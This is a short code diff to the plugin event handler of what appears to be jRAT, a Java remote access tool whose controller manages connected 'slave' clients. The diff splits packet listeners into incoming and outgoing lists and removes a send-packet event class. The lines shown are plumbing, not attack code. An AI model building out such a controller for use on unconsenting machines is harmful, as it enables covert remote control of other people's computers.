@@ -6,7 +6,6 @@ import jrat.api.events.Event;
 import jrat.api.events.EventType;
 import jrat.api.events.OnConnectEvent;
 import jrat.api.events.OnDisconnectEvent;
-import jrat.api.events.OnSendPacketEvent;
 import jrat.api.net.PacketListener;
 import se.jrat.controller.AbstractSlave;
 
@@ -15,7 +14,7 @@ public class PluginEventHandler {
 	public static void onPacket(AbstractSlave slave, byte header) {				
 		Client client = ClientFormat.format(slave);
 		
-		for (PacketListener l : Packet.getEvents(header)) {
+		for (PacketListener l : Packet.getIncoming(header)) {
 			l.perform(client);
 		}
 	}
@@ -37,10 +36,10 @@ public class PluginEventHandler {
 	}
 
 	public static void onSendPacket(byte header, AbstractSlave slave) {
-		OnSendPacketEvent e = new OnSendPacketEvent(new Packet(header), ClientFormat.format(slave));
+		Client client = ClientFormat.format(slave);
 		
-		for (Event event : Event.getHandler().getEvents(EventType.EVENT_SERVER_PACKET_SEND)) {
-			event.perform(e);
+		for (PacketListener l : Packet.getOutgoing(header)) {
+			l.perform(client);
 		}
 	}
 
